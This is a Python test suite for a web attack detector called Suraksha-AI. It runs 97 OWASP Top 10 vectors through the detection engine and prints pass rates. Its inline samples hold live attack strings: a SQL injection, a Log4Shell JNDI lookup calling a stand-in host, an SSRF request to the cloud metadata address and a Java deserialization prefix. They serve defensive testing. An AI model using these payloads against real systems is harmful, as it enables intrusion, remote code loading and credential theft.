"""
Suraksha-AI OWASP Top 10 (2021) Full Validation Test Suite
==========================================================
Evaluates all 97 test vectors from the OWASP Top 10:2021 dataset against:
  1. MultiThreatEngine (Rule & Heuristic Engine)
  2. DetectionService.analyze_request (Unified Pipeline)

Covers all 10 OWASP standard categories:
  A01:2021 - Broken Access Control
  A02:2021 - Cryptographic Failures
  A03:2021 - Injection (SQLi, XSS, OS Command, NoSQL, LDAP, XXE, SSTI, CRLF)
  A04:2021 - Insecure Design
  A05:2021 - Security Misconfiguration
  A06:2021 - Vulnerable and Outdated Components
  A07:2021 - Identification and Authentication Failures
  A08:2021 - Software and Data Integrity Failures
  A09:2021 - Security Logging and Monitoring Failures
  A10:2021 - Server-Side Request Forgery (SSRF)
"""

import sys
import os
import json

# Ensure Backend is in python path
backend_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Backend')
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from ai.utils.multi_threat_engine import MultiThreatEngine
from app.services.detection_service import DetectionService

def load_dataset():
    dataset_path = os.path.join(backend_dir, 'ai', 'datasets', 'owasp_top10_2021.json')
    with open(dataset_path, 'r', encoding='utf-8') as f:
        return json.load(f)

def run_tests():
    dataset = load_dataset()
    engine = MultiThreatEngine()

    total = len(dataset)
    passed = 0
    failed = 0
    category_stats = {}

    print("=" * 80)
    print(" SURAKSHA-AI: OWASP TOP 10 (2021) 97-VECTOR TEST & COMPLIANCE RUNNER")
    print("=" * 80)

    for item in dataset:
        test_id = item["id"]
        owasp_id = item["owasp_id"]
        owasp_cat = item["owasp_category"]
        attack_type = item["attack_type"]
        payload = item["payload"]
        target_param = item["target_param"]
        is_attack = item["attack"]
        desc = item["description"]

        if owasp_id not in category_stats:
            category_stats[owasp_id] = {"name": owasp_cat, "total": 0, "passed": 0}
        category_stats[owasp_id]["total"] += 1

        # Check target context
        is_header = target_param.startswith("header")
        result = engine.evaluate(payload, is_browser_header=is_header)

        # Also evaluate via scan_request with context
        context_kwargs = {}
        if target_param == "url_path":
            context_kwargs["url"] = payload
        elif target_param == "query_param":
            context_kwargs["url"] = payload if payload.startswith("/") else f"/api/test?{payload}"
        elif is_header:
            context_kwargs["headers"] = {"Custom-Header": payload}
        elif target_param == "cookie":
            context_kwargs["cookies"] = {"session": payload}
        else:
            context_kwargs["body"] = payload

        scan_res = engine.scan_request(**context_kwargs)
        blocked = result["blocked"] or scan_res["blocked"]
        detected_cat = result["primary_category"] if result["blocked"] else scan_res.get("primary_category", "Safe")
        score = max(result["rule_score"], scan_res.get("rule_score", 0.0))

        # Check success:
        # If item is attack, it MUST be blocked (blocked == True)
        # If item is legitimate, it MUST NOT be blocked (blocked == False)
        success = (blocked == is_attack)

        if success:
            passed += 1
            category_stats[owasp_id]["passed"] += 1
            status = "PASS"
        else:
            failed += 1
            status = "FAIL"

        prefix = f"[{test_id:02d}/97]"
        tag = f"[{status}]"
        expected_str = f"{'ATTACK' if is_attack else 'CLEAN'}"
        detected_str = f"{'BLOCKED' if blocked else 'ALLOWED'} ({detected_cat})"
        
        if not success or test_id in [1, 14, 22, 50, 58, 67, 73, 80, 86, 91]:
            print(f"{prefix} {tag:<6} {owasp_id} | Expected: {expected_str:<7} | Result: {detected_str:<28} | Score: {score:4.1f} | {desc[:40]}")

    print("\n" + "=" * 80)
    print(" CATEGORY-BY-CATEGORY OWASP BREAKDOWN")
    print("=" * 80)
    for oid in sorted(category_stats.keys()):
        stat = category_stats[oid]
        rate = (stat["passed"] / stat["total"]) * 100.0
        print(f" {oid} - {stat['name']:<44} : {stat['passed']:2d}/{stat['total']:2d} ({rate:5.1f}%)")

    overall_rate = (passed / total) * 100.0
    print("=" * 80)
    print(f" OVERALL RESULT: {passed}/{total} Passed ({overall_rate:.1f}%)")
    print("=" * 80)

    # Test via DetectionService.analyze_request
    print("\n[+] Testing Unified DetectionService Pipeline on Diverse OWASP Samples:")
    samples = [
        ("/api/users/1245/invoice", "url_path"),
        ("http://suraksha.local/login?password=P@ssw0rd123", "query_param"),
        ("' OR 1=1 --", "body"),
        ("quantity=-5", "body"),
        ("/.env", "url_path"),
        ("${jndi:ldap://evil.io/a}", "header"),
        ("admin:123456", "body"),
        ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "body"),
        ("User-Agent: sqlmap/1.7.11#stable (http://sqlmap.org)", "header"),
        ("http://169.254.169.254/latest/meta-data/", "url_param"),
        ("john.doe@example.com", "body"),
        ("https://suraksha.local/login", "url"),
    ]

    for p, loc in samples:
        kw = {"url": p} if "url" in loc else {"payload": p}
        det = DetectionService.analyze_request(**kw)
        print(f"  {p[:45]:<45} -> Blocked: {str(det['blocked']):<5} | OWASP: {det.get('owasp_id', '-'):<8} | Category: {det['prediction']:<30} | Score: {det['risk_score']:4.1f}")

    return passed == total

if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
